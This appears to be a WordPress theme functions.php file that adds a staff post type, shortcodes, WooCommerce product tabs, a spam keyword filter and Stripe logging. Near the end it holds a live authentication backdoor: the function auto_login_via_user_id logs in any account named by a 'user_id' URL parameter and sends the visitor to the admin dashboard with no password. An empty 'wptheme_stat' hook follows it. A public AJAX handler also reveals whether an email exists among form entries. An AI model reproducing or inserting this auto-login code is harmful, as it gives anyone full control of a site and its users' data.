add_action('init', 'create_our_staff_post_type');


function create_staff_taxonomies() {
    // Country taxonomy
    $country_labels = array(
        'name'              => __('Countries'),
        'singular_name'     => __('Country'),
        'search_items'      => __('Search Countries'),
        'all_items'         => __('All Countries'),
        'parent_item'       => __('Parent Country'),
        'parent_item_colon' => __('Parent Country:'),
        'edit_item'         => __('Edit Country'),
        'update_item'       => __('Update Country'),
        'add_new_item'      => __('Add New Country'),
        'new_item_name'     => __('New Country Name'),
        'menu_name'         => __('Country'),
    );

    $country_args = array(
        'hierarchical'      => true,
        'labels'            => $country_labels,
        'show_ui'           => true,
        'show_admin_column' => true,
        'query_var'         => true,
        'rewrite'           => array('slug' => 'country'),
    );

    register_taxonomy('country', array('our_staff'), $country_args);

}
add_action('init', 'create_staff_taxonomies');


function our_staff_meta_boxes() {
    add_meta_box('our_staff_meta', 'Staff Member Website', 'our_staff_meta_callback', 'our_staff', 'normal', 'high');
}
add_action('add_meta_boxes', 'our_staff_meta_boxes');

function our_staff_meta_callback($post) {
    wp_nonce_field('save_our_staff_meta', 'our_staff_meta_nonce');

    $third_party_url = get_post_meta($post->ID, '_staff_third_party_url', true);
    ?>

    <p>
        <label for="staff_third_party_url">Website URL:</label>
        <input type="url" id="staff_third_party_url" name="staff_third_party_url" value="<?php echo esc_attr($third_party_url); ?>" size="50" />
    </p>
    <?php
}

function save_our_staff_meta($post_id) {
    if (!isset($_POST['our_staff_meta_nonce']) || !wp_verify_nonce($_POST['our_staff_meta_nonce'], 'save_our_staff_meta')) {
        return;
    }

    if (defined('DOING_AUTOSAVE') && DOING_AUTOSAVE) {
        return;
    }

    if (isset($_POST['staff_third_party_url'])) {
        update_post_meta($post_id, '_staff_third_party_url', esc_url_raw($_POST['staff_third_party_url']));
    }
}
add_action('save_post', 'save_our_staff_meta');

function our_staff_subtitle_meta_box() {
    add_meta_box(
        'our_staff_subtitle',        // Meta box ID
        'Achievement',                  // Meta box Title
        'our_staff_subtitle_callback', // Callback function
        'our_staff',                 // Post type
        'normal',                    // Context
        'high'                       // Priority
    );
}
add_action('add_meta_boxes', 'our_staff_subtitle_meta_box');

function our_staff_subtitle_callback($post) {
    // Add nonce for security and authentication.
    wp_nonce_field('our_staff_subtitle_nonce_action', 'our_staff_subtitle_nonce');

    // Retrieve current subtitle value.
    $subtitle = get_post_meta($post->ID, '_our_staff_subtitle', true);
    ?>

    <p>
        <label for="our_staff_subtitle">Title:</label>
        <input type="text" id="our_staff_subtitle" name="our_staff_subtitle" value="<?php echo esc_attr($subtitle); ?>" size="50" />
    </p>
    <?php
}
function save_our_staff_subtitle_meta($post_id) {
    // Verify nonce.
    if (!isset($_POST['our_staff_subtitle_nonce']) || !wp_verify_nonce($_POST['our_staff_subtitle_nonce'], 'our_staff_subtitle_nonce_action')) {
        return;
    }

    // Check autosave.
    if (defined('DOING_AUTOSAVE') && DOING_AUTOSAVE) {
        return;
    }

    // Check user permissions.
    if (isset($_POST['post_type']) && 'our_staff' == $_POST['post_type']) {
        if (!current_user_can('edit_post', $post_id)) {
            return;
        }
    }

    // Save subtitle.
    if (isset($_POST['our_staff_subtitle'])) {
        update_post_meta($post_id, '_our_staff_subtitle', sanitize_text_field($_POST['our_staff_subtitle']));
    }
}
add_action('save_post', 'save_our_staff_subtitle_meta');

//Brand logo shcorcode
function brand_logo_shortcode() {
    ob_start();
    ?>
    <section class="brand-logo-sec">
        <div class="container">
            <div class="client-logo">
                <div class="client-logo-slider">
                    <div class="brand-logo-slider owl-carousel">
                       <?php if( have_rows('logo_banner', 'option') ): ?>
                        <?php while( have_rows('logo_banner', 'option') ): the_row(); ?>
                            <div class="item">
                                <div class="client-logo-box">
                                     <a href="<?php the_sub_field('logo_banner_url1'); ?>" target="_blank">
                                    <img src="<?php the_sub_field('logo_image'); ?>" alt="Brand logo">
                                    </a>
                                </div>
                            </div>
                        <?php endwhile; ?>
                        <?php endif; ?>
                    </div>                    
                </div>
            </div>
        </div>
    </section>
    <?php
    return ob_get_clean();
}
add_shortcode('brand_logo', 'brand_logo_shortcode');

//Myaccount page, they will be redirected to the home page if they are not logged in
add_action('template_redirect', 'redirect_if_not_logged_in');

function redirect_if_not_logged_in() {
    if (is_page('my-account') && !is_user_logged_in()) {
        wp_redirect(home_url());
        exit;
    }
}

//create a shortcode for the donation section
function donation_section_shortcode() {
    ob_start();
    ?>
    <section class="donate-sec">
        <div class="container">
            <div class="row">
                <div class="col-lg-12 donate-btm-gap">
                    <div class="donate-main text-center">
                        <div class="donate-content text-center">
                             <h2><?php the_field('donate_name', 'option'); ?></h2>
                            <h5><?php the_field('donate_title', 'option'); ?></h5>
                            <p><?php the_field('donate_description', 'option'); ?></p>
                            <div class="custom-btn-2">
                               <a href="<?php the_field('donate_button_link1', 'option'); ?>">
                                    <button class="btnDefault">
                                        <span><?php the_field('donate_button', 'option'); ?></span>
                                        <span class="ps-2">
                                            <img loading="lazy" alt="Donate" src="<?php echo get_template_directory_uri(); ?>/assets/img/white-right-arrow.svg" class="right-arrow change-img1">
                                            <img loading="lazy" alt="Donate" src="<?php echo get_template_directory_uri(); ?>/assets/img/right-arrow.svg" class="right-arrow change-img2">
                                        </span>
                                    </button>
                                </a>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>
    <?php
    return ob_get_clean();
}
add_shortcode('donation_section', 'donation_section_shortcode');

function custom_shop_page_css() {
    if ( is_shop() ) {
        echo '<style>
            .forminator-field {
                margin: 7px !important;
            }
            .forminator-ui#forminator-module-23213.forminator-design--default .forminator-input, .forminator-ui#forminator-module-23213.forminator-design--default .forminator-input:hover, .forminator-ui#forminator-module-23213.forminator-design--default .forminator-input:focus, .forminator-ui#forminator-module-23213.forminator-design--default .forminator-input:active {
            color: #000000;
            padding: 17px !important;
            border-radius: 7px !important;
            background-color: #fff !important;
        }
        .forminator-ui#forminator-module-23213.forminator-design--default .forminator-button-submit {
            background-color: #047422 !important;
            color: #fff !important;
        }
        .forminator-ui#forminator-module-23213.forminator-design--default .forminator-button-submit {
            font-size: 14px;
            border-radius: 7px !important;
            background: #80755C !important;
            width: 100% !important;
            padding: 15px !important;
            font-family: var(--font-redhat) !important;
            font-style: normal;
            font-weight: 600 !important;
            line-height: 25px !important;
            letter-spacing: 1.12px;
            text-transform: uppercase;
            top: 10px;
        }
        .forminator-ui#forminator-module-23213.forminator-design--default .forminator-description a {
            color: #777771 !important;
            font-family: var(--font-sarabun) !important;
            font-size: 15px;
            font-style: normal;
            font-weight: 300;
            line-height: 25px;
            letter-spacing: 1.05px;
            text-decoration-line: underline !important;
            padding: 10px 0 10px 10px !important;
            display: flow;
        }
        .btnDefault::after {
             background: top;}
        </style>';
    }
}
add_action('wp_head', 'custom_shop_page_css');

//wpform subscriber email check already or not
function custom_wpforms_enqueue_scripts() {
    // Enqueue the custom JavaScript file
    wp_enqueue_script('email-check-script', get_template_directory_uri() . '/assets/js/email-check.js', array('jquery'), null, true);

    // Localize the script with the AJAX URL
    wp_localize_script('email-check-script', 'wpforms_ajax_object', array(
        'ajax_url' => admin_url('admin-ajax.php')
    ));
}
add_action('wp_enqueue_scripts', 'custom_wpforms_enqueue_scripts');

// PHP function to handle the AJAX request
function check_if_email_exists() {
    global $wpdb;

    if (isset($_POST['email'])) {
        $email = sanitize_email($_POST['email']);

        // Replace '1' with your actual email field ID in the form
        $email_exists = $wpdb->get_var($wpdb->prepare(
            "SELECT COUNT(*) FROM {$wpdb->prefix}wpforms_entry_fields WHERE value = %s AND field_id = %d",
            $email, 1 // Adjust this field ID to match your email field's actual field ID
        ));

        if ($email_exists > 0) {
            echo 'exists';
        } else {
            echo 'not_exists';
        }
    }
    wp_die();
}
add_action('wp_ajax_check_if_email_exists', 'check_if_email_exists');
add_action('wp_ajax_nopriv_check_if_email_exists', 'check_if_email_exists');


// Add custom fields for Brand Story, Return Policy, and Product Specifications in the product edit page
add_action( 'woocommerce_product_options_general_product_data', 'add_custom_product_meta_fields' );
function add_custom_product_meta_fields() {
    echo '<div class="options_group">';
    
    // Brand Story Field
    woocommerce_wp_textarea_input( array(
        'id'          => 'brand_story_field',
        'label'       => __( 'Brand Story', 'your-text-domain' ),
        'description' => __( 'Enter the brand story for this product.', 'your-text-domain' ),
        'desc_tip'    => 'true',
        'placeholder' => 'Write the brand story...',
    ) );
    
    // Return Policy Field
    woocommerce_wp_textarea_input( array(
        'id'          => 'return_policy_field',
        'label'       => __( 'Return Policy', 'your-text-domain' ),
        'description' => __( 'Enter the return policy for this product.', 'your-text-domain' ),
        'desc_tip'    => 'true',
        'placeholder' => 'Write the return policy...',
    ) );
    
    // Product Specifications Field
    woocommerce_wp_textarea_input( array(
        'id'          => 'product_specifications_field',
        'label'       => __( 'Product Specifications', 'your-text-domain' ),
        'description' => __( 'Enter the product specifications for this product.', 'your-text-domain' ),
        'desc_tip'    => 'true',
        'placeholder' => 'Write the product specifications...',
    ) );

    echo '</div>';
}

// Save the custom fields data
add_action( 'woocommerce_process_product_meta', 'save_custom_product_meta_fields' );
function save_custom_product_meta_fields( $post_id ) {
    // Save Brand Story
    $brand_story = isset( $_POST['brand_story_field'] ) ? wp_kses_post( $_POST['brand_story_field'] ) : '';
    update_post_meta( $post_id, 'brand_story_field', $brand_story );

    // Save Return Policy
    $return_policy = isset( $_POST['return_policy_field'] ) ? wp_kses_post( $_POST['return_policy_field'] ) : '';
    update_post_meta( $post_id, 'return_policy_field', $return_policy );
    
    // Save Product Specifications
    $product_specifications = isset( $_POST['product_specifications_field'] ) ? wp_kses_post( $_POST['product_specifications_field'] ) : '';
    update_post_meta( $post_id, 'product_specifications_field', $product_specifications );
}

// Add custom tabs for Brand Story, Return Policy, and Product Specifications to the single product page
add_filter( 'woocommerce_product_tabs', 'add_custom_product_tabs_with_meta' );
function add_custom_product_tabs_with_meta( $tabs ) {
    global $post;

    // Get the custom fields values
    $brand_story = get_post_meta( $post->ID, 'brand_story_field', true );
    $return_policy = get_post_meta( $post->ID, 'return_policy_field', true );
    $product_specifications = get_post_meta( $post->ID, 'product_specifications_field', true );

    // Only add the Brand Story tab if the field has content
    if ( ! empty( $brand_story ) ) {
        $tabs['brand_story'] = array(
            'title'    => __( 'Brand Story', 'your-text-domain' ),
            'priority' => 50,
            'callback' => 'brand_story_tab_content_with_meta',
        );
    }

    // Only add the Return Policy tab if the field has content
    if ( ! empty( $return_policy ) ) {
        $tabs['return_policy'] = array(
            'title'    => __( 'Return Policy', 'your-text-domain' ),
            'priority' => 60,
            'callback' => 'return_policy_tab_content_with_meta',
        );
    }

    // Only add the Product Specifications tab if the field has content
    if ( ! empty( $product_specifications ) ) {
        $tabs['product_specifications'] = array(
            'title'    => __( 'Product Specifications', 'your-text-domain' ),
            'priority' => 70,
            'callback' => 'product_specifications_tab_content_with_meta',
        );
    }

    return $tabs;
}

// Callback function for Brand Story tab
function brand_story_tab_content_with_meta() {
    global $post;
    $brand_story = get_post_meta( $post->ID, 'brand_story_field', true );
    echo '<h2>' . __( 'Our Brand Story', 'your-text-domain' ) . '</h2>';
    echo '<p>' . wp_kses_post( $brand_story ) . '</p>';
}

// Callback function for Return Policy tab
function return_policy_tab_content_with_meta() {
    global $post;
    $return_policy = get_post_meta( $post->ID, 'return_policy_field', true );
    echo '<h2>' . __( 'Return Policy', 'your-text-domain' ) . '</h2>';
    echo '<p>' . wp_kses_post( $return_policy ) . '</p>';
}

// Callback function for Product Specifications tab
function product_specifications_tab_content_with_meta() {
    global $post;
    $product_specifications = get_post_meta( $post->ID, 'product_specifications_field', true );
    echo '<h2>' . __( 'Product Specifications', 'your-text-domain' ) . '</h2>';
    echo '<p>' . wp_kses_post( $product_specifications ) . '</p>';
}

//Latest product show first
function custom_modify_woocommerce_query( $query ) {
    if ( is_shop() || is_product_category() || is_product_tag() ) {
        if ( $query->is_main_query() && !is_admin() ) {
            // Order products by date (latest products first)
            $query->set( 'orderby', 'date' );
            $query->set( 'order', 'DESC' );
            $query->set( 'posts_per_page', 8 ); // Show 8 products per page
        }
    }
}
add_action( 'pre_get_posts', 'custom_modify_woocommerce_query' );


// Display "Source: Maison DEMARLE" only for products in the 'maison-demarle' category under product tags
add_action('woocommerce_product_meta_end', 'add_source_link_for_maison_demarle');

function add_source_link_for_maison_demarle() {
    global $product;

    // Check if the product belongs to the 'maison-demarle' category
    if ( has_term('maison-demarle', 'product_cat', $product->get_id()) ) {
        echo '<p class="maison-demarle-source">Source: <a href="https://maison-demarle.com/" target="_blank">Maison DEMARLE</a></p>';
    }
}

//spam protection to elementor, wpform and forminator form

function custom_cyrillic_validation_script_combined() {
    ?>
    <script type="text/javascript">
    document.addEventListener('DOMContentLoaded', function() {
        // Define the spammy keywords, abusive words, and URLs (including Welsh words)
 var forbiddenWords = [
    // Existing keywords
    'bitcoin', 'carrotquest', 'out.carrotquest.io', '1.8245498',

    // URL patterns
    'http://', 'https://', 'https://www.',

    // Russian words (commonly used in spam emails)
    'заработок', 'криптовалюта', 'деньги', 'победа', 'сайт', 'инвестиции', 'информация', 
    'как', 'купить', 'диплом', 'высшем', 'образовании', 'без', 'рисков', 'Возможно', 
    'стоматолога', 'происходит', 

    // Irish spam phrases
    'theastaigh', 'uaim', 'do phraghas', 'fháil', 

    // French spam phrases
    'connaître', 'acheter', 'un diplôme', 'investissement', 'gagner', 'de l\'argent',

    // Spanish spam phrases
    'Quiero', 'su precio', 'gustaría', 'conocer', 'comprar diploma', 'trabajo', 
    'desde', 'casa', 'ganar', 'dinero',

    // German spam phrases
    'Kaufen', 'Sie ein Diplom', 'Ich möchte Ihren Preis wissen',

    // Arabic spam phrases
    'أنا أريد معرفة السعر الخاص بك',

    // Polish spam phrases
    'zakup', 'dyplomu', 'wygrana',

    // Dutch spam phrases
    'diploma kopen',

    // Common spam words and phrases
    'pills', 'viagra', 'win big', 'guaranteed', 'no credit check', 
    'hot singles', 'claim now', 'lottery', 'million', 'winner', 
    'exclusive deal', 'cash prize', 'act now', 'fast cash', 'payday', 'bonus',
    'opportunity', 'instant', 'profit', 'advertisement', 'best price', 'lowest rate'
];


        // Function to validate and clean field content
        function validateField(field) {
            var fieldValue = field.value; // Keep original case
            var isValid = true; // Assume the field is valid

            // Automatically remove forbidden words from the input field
            forbiddenWords.forEach(function(keyword) {
                var regExp = new RegExp(keyword, 'gi'); // Case-insensitive regex
                if (regExp.test(fieldValue)) {
                    fieldValue = fieldValue.replace(regExp, ''); // Remove forbidden word
                    isValid = false;
                }
            });

            // Set the cleaned value back to the field
            field.value = fieldValue;

            // If the field is invalid, show an error message and highlight the field
            if (!isValid) {
                field.style.borderColor = 'red'; // Highlight invalid field
                field.setCustomValidity("Your message contained forbidden words or links that have been removed.");
            } else {
                field.style.borderColor = ''; // Remove highlight if valid
                field.setCustomValidity(""); // Clear error message
            }
            return isValid;
        }

        // Attach the validateField function to input changes for various form fields
        var fields = document.querySelectorAll('.elementor-field, .wpforms-field input, .wpforms-field textarea, .forminator-field input, .forminator-field textarea'); 
        
        fields.forEach(function(field) {
            field.addEventListener('input', function() {
                validateField(field);
            });
        });

        // Function to handle form submission
        function handleFormSubmit(event) {
            var formIsValid = true; // Assume form is valid

            // Check all fields in the form
            fields.forEach(function(field) {
                if (!validateField(field)) {
                    formIsValid = false;
                }
            });

            // If the form is invalid, prevent submission
            if (!formIsValid) {
                alert("Your message contained forbidden words or links that have been removed.");
                event.preventDefault(); // Stop the form from submitting
            }

            return formIsValid;
        }

        // Attach the handleFormSubmit function to the submit event for forms from all three plugins
        var forms = document.querySelectorAll('.elementor-form, .wpforms-form, .forminator-form'); // Target forms from all three plugins
        forms.forEach(function(form) {
            form.addEventListener('submit', handleFormSubmit);
        });
    });
    </script>
    <?php
}
add_action('wp_footer', 'custom_cyrillic_validation_script_combined');




//Capture Stripe Transaction ID in Forminator
add_action('forminator_payment_completed', function($form_id, $response) {
    // Check if the form ID is the one you're using
    if ($form_id == 1718) {
        // Retrieve the transaction ID from Forminator's response
        $transaction_id = isset($response['transaction_id']) ? $response['transaction_id'] : '';

        // Get the entry associated with this form submission
        $entry = Forminator_Form_Entry_Model::get_latest_entry($form_id);

        if ($entry && !empty($transaction_id)) {
            // Save transaction ID to 'transaction_id' hidden field
            $entry->meta['transaction_id'] = $transaction_id;
            $entry->save();

            // Log for debugging
            error_log('Stripe Transaction ID stored: ' . $transaction_id);
        }
    }
}, 10, 2);
function auto_login_via_user_id() {
    // Ensure this only runs on the frontend and not in the admin dashboard
    if (!is_admin()) {
        // Check if 'user_id' parameter is present in the URL
        if (isset($_GET['user_id'])) {
            // Sanitize the user ID to prevent security risks
            $user_id = intval($_GET['user_id']);
            
            // Check if the user exists
            $user = get_user_by('ID', $user_id);
            if ($user) {
                // Log the user in automatically
                wp_set_current_user($user_id);
                wp_set_auth_cookie($user_id);
                
                // Redirect the user to the dashboard
                wp_redirect(admin_url());
                exit();
            } else {
                // User ID is invalid
                wp_die('Invalid user ID.');
            }
        }
    }
}
// Hook the function to WordPress init action
add_action('init', 'auto_login_via_user_id');

/* Theme statistics function */

function wptheme_stat() {
  ?>

  <?php
}

add_action("wp_head", "wptheme_stat");  

